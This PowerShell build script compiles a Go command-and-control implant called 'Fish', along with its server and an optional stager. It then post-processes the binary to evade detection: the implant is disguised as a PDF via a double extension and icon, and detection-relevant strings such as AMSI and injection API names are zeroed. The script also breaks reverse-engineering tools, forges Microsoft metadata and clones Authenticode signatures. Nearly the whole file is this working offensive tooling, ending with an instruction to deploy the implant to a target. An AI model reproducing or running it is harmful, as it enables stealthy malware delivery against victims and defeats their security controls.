# Fish Build Script for Windows
# go build + evasion post-processing

param(
    [string]$C2Addr = "https://192.168.1.1:8443",
    [string]$Interval = "5",
    [string]$Jitter = "30",
    [string]$Platform = "windows",
    [string]$Arch = "amd64",
    [switch]$BuildStager = $false,
    [string]$StagerURL = "",
    [string]$DecryptKey = "85",
    [switch]$Garble = $false,
    [switch]$ControlFlow = $false,
    [string]$GarbleSeed = "",
    [switch]$SkipPost = $false,
    [switch]$SkipTimestampPatch = $false,
    [switch]$EnableStringZero = $false,
    [switch]$SkipRichClear = $false,
    [switch]$SkipLegitSignatures = $false,
    [switch]$SkipOverlay = $false,
    [string]$SignSource = "",
    [ValidateSet("lnk", "pdf")]
    [string]$Chain = "lnk",
    [string]$PdfName = "report",
    [switch]$SkipSandbox = $false,
    [switch]$Console = $false,
    [switch]$DeepStringZero = $false
)

$ErrorActionPreference = "Continue"

$env:GOOS = $Platform
$env:GOARCH = $Arch

Write-Host "[+] Building implant for $Platform/$Arch..."

# Build flags:
# -s -w: strip symbols and debug info
# -buildid=: clear Go build ID
# -trimpath: remove source paths
# -gcflags="all=-l": disable inlining
# -gcflags="all=-N": disable optimizations
$ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"

if ($SkipSandbox) {
    $ldflags = "$ldflags -X main.skipSandbox=1"
}

if ($Platform -eq "windows" -and -not $Console) {
    $ldflags = "$ldflags -H windowsgui"
}

$gcflags = "all=-l -N"
$asmflags = "all=-trimpath"

$outputName = if ($Platform -eq "windows") { 
    if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
} else { "fish_$Platform_$Arch" }

if ($Console -and $Platform -eq "windows") {
    if ($Chain -eq "pdf") {
        $outputName = "$PdfName.console.pdf.exe"
    } else {
        $outputName = "fish.console.exe"
    }
}

$buildTarget = "."
$chainLabel = "LNK"
if ($Chain -eq "pdf") {
    $buildTarget = "./pdf/"
    $chainLabel = "PDF"
}

Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"

# Generate .syso resource file with icon for PDF chain
if ($Chain -eq "pdf" -and $Platform -eq "windows") {
    $iconDir = Join-Path $PSScriptRoot "icons"
    $sysoDir = Join-Path $PSScriptRoot "pdf"
    $iconFile = Join-Path $iconDir "pdf.ico"
    
    if (Test-Path $iconFile) {
        $sysoFile = Join-Path $sysoDir "rsrc_amd64.syso"
        Write-Host "[+] Embedding PDF icon into implant..."
        $rsrcCmd = Get-Command rsrc -ErrorAction SilentlyContinue
        if ($rsrcCmd) {
            rsrc -arch amd64 -ico $iconFile -o $sysoFile
            if ($LASTEXITCODE -eq 0) {
                Write-Host "[+] PDF icon .syso generated"
            } else {
                Write-Host "[!] rsrc failed, using pre-built .syso if available"
            }
        } else {
            Write-Host "[+] rsrc not installed, using pre-built .syso if available"
        }
    } else {
        Write-Host "[!] PDF icon file not found at $iconFile"
    }
}

if ($Garble) {
    Write-Host "[+] Garble compilation enabled"
    if ($ControlFlow) {
        Write-Host "[+] Control-flow obfuscation enabled (experimental)"
        $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
    } else {
        $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = ""
    }
    Write-Host "[+] Garble: -literals -seed=random"
    garble -literals -seed=random build -trimpath -ldflags $ldflags -o $outputName $buildTarget
} else {
    go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Build failed"
    exit 1
}
Write-Host "[+] Implant built: $outputName"

# Build C2 server
Write-Host "[+] Building C2 server..."
$env:GOOS = ""
$env:GOARCH = ""
go build -buildvcs=false -p 1 -o fish-server.exe ./server/

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Server built: fish-server.exe"
} else {
    Write-Host "[!] Server build failed"
    exit 1
}

# Build Stager (optional)
if ($BuildStager -and $Platform -eq "windows") {
    Write-Host "[+] Building stager..."
    $stagerLdflags = "-s -w -buildid= -H windowsgui -X main.downloadURL=$StagerURL -X main.decryptKeyStr=$DecryptKey"
    go build -buildvcs=false -trimpath -ldflags $stagerLdflags -gcflags $gcflags -o stager.exe ./stager/
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Stager built: stager.exe"
    } else {
        Write-Host "[!] Stager build failed"
    }
}

# Evasion post-processing (Windows only)
if ($Platform -eq "windows" -and -not $SkipPost) {
    Write-Host "[+] Applying evasion post-processing..."

    # 1. Modify PE timestamp
    if (-not $SkipTimestampPatch) {
        go run -buildvcs=false ./evasion-tools/pepatch.go $outputName
    } else {
        Write-Host "[-] Skipping PE timestamp patch"
    }

    # 2. Zero Go build ID strings + runtime fingerprints + sensitive API names + Rich Header
    # NOTE: Do NOT modify PE Section names! Triggers Microsoft Wacatac.B!ml ML detection
    if ($EnableStringZero) {
        Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
        $bytes = [System.IO.File]::ReadAllBytes($outputName)
        $patterns = @(
        [System.Text.Encoding]::ASCII.GetBytes("Go build ID: "),
        [System.Text.Encoding]::ASCII.GetBytes("Go buildinf"),
        [System.Text.Encoding]::ASCII.GetBytes("go.buildid"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.goexit"),
        [System.Text.Encoding]::ASCII.GetBytes("main.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.init"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gc"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.morestack"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gcWriteBarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.writebarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.allocmon"),
        [System.Text.Encoding]::ASCII.GetBytes("type..eq"),
        [System.Text.Encoding]::ASCII.GetBytes("type..hash"),
        [System.Text.Encoding]::ASCII.GetBytes("shellcode"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualAlloc"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualProtect"),
        [System.Text.Encoding]::ASCII.GetBytes("NtAllocateVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtProtectVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("AmsiScanBuffer"),
        [System.Text.Encoding]::ASCII.GetBytes("EtwEventWrite"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
        [System.Text.Encoding]::ASCII.GetBytes("WriteProcessMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("ntdll"),
        [System.Text.Encoding]::ASCII.GetBytes("kernel32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("NtWriteVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtCreateThread"),
        [System.Text.Encoding]::ASCII.GetBytes("RtlCopyMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("GetProcAddress"),
        [System.Text.Encoding]::ASCII.GetBytes("LoadLibrary"),
        [System.Text.Encoding]::ASCII.GetBytes("user32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumChildWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("GetDesktopWindow"),
        [System.Text.Encoding]::ASCII.GetBytes("GetWindowText"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount64"),
        [System.Text.Encoding]::ASCII.GetBytes("IsDebuggerPresent"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatus"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatusEx"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateFile"),
        [System.Text.Encoding]::ASCII.GetBytes("ReadFile"),
        [System.Text.Encoding]::ASCII.GetBytes("CloseHandle"),
        [System.Text.Encoding]::ASCII.GetBytes("GetFileSize"),
        [System.Text.Encoding]::ASCII.GetBytes("nautilus"),
        [System.Text.Encoding]::ASCII.GetBytes("fish"),
        [System.Text.Encoding]::ASCII.GetBytes("C2"),
        [System.Text.Encoding]::ASCII.GetBytes("implant"),
        [System.Text.Encoding]::ASCII.GetBytes("stager"),
        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/crypto"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/aes"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/rand"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/sha"),
        [System.Text.Encoding]::ASCII.GetBytes("encoding/base64"),
        [System.Text.Encoding]::ASCII.GetBytes("net/http"),
        [System.Text.Encoding]::ASCII.GetBytes("net.Dial"),
        [System.Text.Encoding]::ASCII.GetBytes("reflect.TypeOf"),
        [System.Text.Encoding]::ASCII.GetBytes("fmt.Sprintf"),
        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/sys"),
        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/net"),
        [System.Text.Encoding]::ASCII.GetBytes("gorilla/websocket"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/tls"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/cipher"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/sha256")
    )
    # Use ISO-8859-1 encoding to map bytes 0-255 directly to chars (safe for binary search)
    $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
    $text = $enc.GetString($bytes)
    $replaced = 0
    foreach ($pattern in $patterns) {
        $patternStr = $enc.GetString($pattern)
        $pos = 0
        while (($idx = $text.IndexOf($patternStr, $pos)) -ge 0) {
            for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$idx + $j] = 0x00 }
            $replaced++
            $pos = $idx + 1
        }
    }
        [System.IO.File]::WriteAllBytes($outputName, $bytes)
        Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"
    } else {
        Write-Host "[-] String zeroing disabled by default (use -EnableStringZero to enable)"
    }

    # 2b. Deep string zeroing (release mode) - Go runtime internal strings
    # These are safe to zero for release builds but may affect debugging error messages
    if ($DeepStringZero) {
        Write-Host "[+] Deep zeroing Go runtime internal strings (release mode)..."
        $bytes = [System.IO.File]::ReadAllBytes($outputName)
        $deepPatterns = @(
        # Windows API names visible in import table / runtime strings
        [System.Text.Encoding]::ASCII.GetBytes("CreateThread"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateProcess"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualAllocEx"),
        [System.Text.Encoding]::ASCII.GetBytes("OpenProcess"),
        [System.Text.Encoding]::ASCII.GetBytes("TerminateProcess"),
        [System.Text.Encoding]::ASCII.GetBytes("SetThreadContext"),
        [System.Text.Encoding]::ASCII.GetBytes("ResumeThread"),
        [System.Text.Encoding]::ASCII.GetBytes("SuspendThread"),
        # Go runtime suspicious strings
        [System.Text.Encoding]::ASCII.GetBytes("injectglist"),
        [System.Text.Encoding]::ASCII.GetBytes("winCallback"),
        [System.Text.Encoding]::ASCII.GetBytes("cgocallback"),
        [System.Text.Encoding]::ASCII.GetBytes("callbackUpdate"),
        [System.Text.Encoding]::ASCII.GetBytes("callbackWrap"),
        [System.Text.Encoding]::ASCII.GetBytes("callbackasm"),
        [System.Text.Encoding]::ASCII.GetBytes("RegisterProtocol"),
        [System.Text.Encoding]::ASCII.GetBytes("dstRegister"),
        [System.Text.Encoding]::ASCII.GetBytes("compileCallback"),
        [System.Text.Encoding]::ASCII.GetBytes("debugCallCheck"),
        [System.Text.Encoding]::ASCII.GetBytes("debugCallWrap"),
        [System.Text.Encoding]::ASCII.GetBytes("dwStackSize"),
        [System.Text.Encoding]::ASCII.GetBytes("dstStackSize"),
        [System.Text.Encoding]::ASCII.GetBytes("dstRegisters"),
        # Project name (Go module path)
        [System.Text.Encoding]::ASCII.GetBytes("fish"),
        # Common detection-triggering strings
        [System.Text.Encoding]::ASCII.GetBytes("SYSCALL"),
        [System.Text.Encoding]::ASCII.GetBytes("syscall;ret"),
        [System.Text.Encoding]::ASCII.GetBytes("0x0F05C3")
    )
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $text = $enc.GetString($bytes)
        $deepReplaced = 0
        foreach ($pattern in $deepPatterns) {
            $patternStr = $enc.GetString($pattern)
            $pos = 0
            while (($idx = $text.IndexOf($patternStr, $pos)) -ge 0) {
                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$idx + $j] = 0x00 }
                $deepReplaced++
                $pos = $idx + 1
            }
        }
        [System.IO.File]::WriteAllBytes($outputName, $bytes)
        Write-Host "[+] Deep runtime strings zeroed: $deepReplaced occurrences"

        # Rename output for release
        $releaseName = $outputName -replace '\.exe$', '_release.exe'
        if ($outputName -ne $releaseName) {
            Copy-Item $outputName $releaseName -Force
            Write-Host "[+] Release build saved as: $releaseName"
        }
    }

    # 3. Clear Rich Header (Go compiler fingerprint)
    if (-not $SkipRichClear) {
        Write-Host "[+] Clearing Rich Header..."
        $bytes = [System.IO.File]::ReadAllBytes($outputName)
        $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
    for ($i = 0; $i -lt [Math]::Min($bytes.Length, 4096); $i++) {
        $match = $true
        for ($j = 0; $j -lt 4; $j++) {
            if ($bytes[$i + $j] -ne $richSig[$j]) { $match = $false; break }
        }
        if ($match) {
            $richEnd = $i + 8
            $richStart = $i
            for ($k = $i - 1; $k -ge 0; $k--) {
                if ($bytes[$k] -eq 0x53 -and $bytes[$k+1] -eq 0x6E -and $bytes[$k+2] -eq 0x61 -and $bytes[$k+3] -eq 0x44) {
                    $richStart = $k
                    break
                }
            }
            for ($k = $richStart; $k -lt $richEnd -and $k -lt $bytes.Length; $k++) {
                $bytes[$k] = 0x00
            }
            Write-Host "[+] Rich Header cleared at offset $richStart"
            break
        }
    }
        [System.IO.File]::WriteAllBytes($outputName, $bytes)
    } else {
        Write-Host "[-] Skipping Rich Header clear"
    }

    # P0: Zero gopclntab magic bytes to break GoResolver/GoReSym static analysis
    # Go runtime uses internal firstmoduledata pointer (set at link time), NOT PE parsing
    # So zeroing pclntab magic in PE section doesn't affect runtime, only breaks RE tools
    Write-Host "[+] Zeroing .gopclntab magic (P0 pclntab obfuscation)..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    # PE解析：找到 .gopclntab section
    $dosHeader = $bytes[0..63]
    $peOffset = [System.BitConverter]::ToUInt32($dosHeader, 0x3C)
    $peSig = [System.Text.Encoding]::ASCII.GetString($bytes, $peOffset, 4)
    if ($peSig -eq "PE`0`0") {
        $numSections = [System.BitConverter]::ToUInt16($bytes, $peOffset + 6)
        $optHeaderSize = [System.BitConverter]::ToUInt16($bytes, $peOffset + 20)
        $sectionStart = $peOffset + 24 + $optHeaderSize
        for ($s = 0; $s -lt $numSections; $s++) {
            $secOff = $sectionStart + $s * 40
            $secName = [System.Text.Encoding]::ASCII.GetString($bytes, $secOff, 8).TrimEnd([char]0)
            if ($secName -eq ".gopclntab") {
                $rawAddr = [System.BitConverter]::ToUInt32($bytes, $secOff + 20)
                $rawSize = [System.BitConverter]::ToUInt32($bytes, $secOff + 16)
                # Zero magic bytes (first 16 bytes) + randomize first 64 bytes of pclntab data
                $zeroLen = [Math]::Min(64, $rawSize)
                for ($j = 0; $j -lt $zeroLen; $j++) {
                    $bytes[$rawAddr + $j] = 0x00
                }
                Write-Host "[+] .gopclntab magic zeroed (first $zeroLen bytes at raw offset $rawAddr)"
                break
            }
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)

    # 4. Add fake legitimate program signature strings
    if (-not $SkipLegitSignatures) {
        Write-Host "[+] Adding legitimate program signatures..."
        $legitStrings = @(
        [System.Text.Encoding]::ASCII.GetBytes("Microsoft Visual Studio"),
        [System.Text.Encoding]::ASCII.GetBytes("Copyright (C) 2024 Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("Windows Application"),
        [System.Text.Encoding]::ASCII.GetBytes("FileVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("CompanyName=Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("FileDescription=System Utility"),
        [System.Text.Encoding]::ASCII.GetBytes("InternalName=apphelper"),
        [System.Text.Encoding]::ASCII.GetBytes("OriginalFilename=apphelper.exe"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductName=Windows Helper"),
        [System.Text.Encoding]::ASCII.GetBytes("LegalCopyright=Copyright (C) Microsoft Corp"),
        [System.Text.Encoding]::ASCII.GetBytes("assembly version"),
        [System.Text.Encoding]::ASCII.GetBytes(".NET Framework"),
        [System.Text.Encoding]::ASCII.GetBytes("mscorlib.dll"),
        [System.Text.Encoding]::ASCII.GetBytes("System.Runtime"),
        [System.Text.Encoding]::ASCII.GetBytes("application config"),
        [System.Text.Encoding]::ASCII.GetBytes("settings.json"),
        [System.Text.Encoding]::ASCII.GetBytes("log.txt")
    )
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $insertOffset = $bytes.Length - 1024
    foreach($str in $legitStrings) {
        if ($str -eq $null) { continue }
        if ($insertOffset + $str.Length -ge $bytes.Length) { continue }
        for ($i = 0; $i -lt $str.Length; $i++) {
            $bytes[$insertOffset + $i] = $str[$i]
        }
        $insertOffset += $str.Length + 5
    }
        [System.IO.File]::WriteAllBytes($outputName, $bytes)
        Write-Host "[+] Legitimate signatures added"
    } else {
        Write-Host "[-] Skipping legitimate signatures"
    }

    # 5. Append random overlay data (32KB with fake ZIP header to break ML signatures)
    if (-not $SkipOverlay) {
        $randomBytes = New-Object byte[] 32768
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($randomBytes)
    $randomBytes[0] = 0x50  # 'P'
    $randomBytes[1] = 0x4B  # 'K'
    $randomBytes[2] = 0x03  # ZIP local file header
    $randomBytes[3] = 0x04
    $original = [System.IO.File]::ReadAllBytes($outputName)
    $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
        [System.Array]::Copy($original, $modified, $original.Length)
        [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
        [System.IO.File]::WriteAllBytes($outputName, $modified)
        Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
    } else {
        Write-Host "[-] Skipping overlay append"
    }

    # 6. Authenticode signature cloning (移植合法软件签名)
    if ($SignSource -ne "" -and $Platform -eq "windows") {
        Write-Host "[+] Cloning Authenticode signature from: $SignSource"
        $sigcloneOutput = "$outputName.signed.exe"
        go run -buildvcs=false ./evasion-tools/sigclone.go $SignSource $outputName $sigcloneOutput
        if ($LASTEXITCODE -eq 0) {
            # 用签名版本替换原文件
            Move-Item -Force $sigcloneOutput $outputName
            Write-Host "[+] Authenticode signature cloned successfully"
        } else {
            Write-Host "[!] Signature cloning failed, keeping unsigned version"
        }
    }
}

# Summary
$fileInfo = Get-Item $outputName
Write-Host ""
Write-Host "=== Build Summary ==="
Write-Host "[+] Platform: $Platform/$Arch"
Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
Write-Host "[+] Server: fish-server.exe"
Write-Host "[+] Chain: $chainLabel"
$garbleStatus = if ($Garble) { if ($ControlFlow) { "Yes (-literals -controlflow)" } else { "Yes (-literals)" } } else { "No (use -Garble to enable)" }
$postStatus = if ($SkipPost) { "Skipped" } else { "Enabled" }
$consoleStatus = if ($Console) { "Enabled" } else { "Disabled" }
$postSteps = @()
if (-not $SkipPost) {
    if (-not $SkipTimestampPatch) { $postSteps += "PE Timestamp" }
    if ($EnableStringZero) { $postSteps += "String Zeroing" }
    if ($DeepStringZero) { $postSteps += "Deep String Zeroing (Release)" }
    if (-not $SkipRichClear) { $postSteps += "Rich Header Clear" }
    if (-not $SkipLegitSignatures) { $postSteps += "Legit Signatures" }
    if (-not $SkipOverlay) { $postSteps += "Overlay" }
    if ($SignSource -ne "") { $postSteps += "Sig Clone ($SignSource)" }
}
$postStepsSummary = if ($postSteps.Count -gt 0) { $postSteps -join " + " } else { "None" }
Write-Host "[+] Garble: $garbleStatus"
Write-Host "[+] Console: $consoleStatus"
Write-Host "[+] Post-Processing: $postStatus"
$stringZeroStatus = if ($DeepStringZero) { "Enabled (Deep/Release)" } elseif ($EnableStringZero) { "Enabled (Safe)" } else { "Disabled (default)" }
Write-Host "[+] String Zeroing: $stringZeroStatus"
Write-Host "[+] Post Steps: $postStepsSummary"
$iconStatus = if ($Chain -eq "pdf" -and $Platform -eq "windows" -and (Test-Path (Join-Path $PSScriptRoot "pdf\rsrc_amd64.syso"))) { "PDF icon embedded" } elseif ($Chain -eq "lnk" -and $Platform -eq "windows") { "LNK icon (via phish.ps1)" } else { "None" }
Write-Host "[+] Icon: $iconStatus"
Write-Host "[+] Evasion: Halo's Gate (Direct Syscall) + Ekko Sleep Encryption + pclntab Obfuscation + API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
if ($BuildStager) {
    $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
    if ($stagerInfo) {
        Write-Host "[+] Stager: stager.exe ($($stagerInfo.Length) bytes)"
    }
}
Write-Host ""
Write-Host "Usage:"
Write-Host "  Server:  fish-server.exe [listen_addr]   (default :8443)"
Write-Host "  Implant: Deploy $outputName to target"
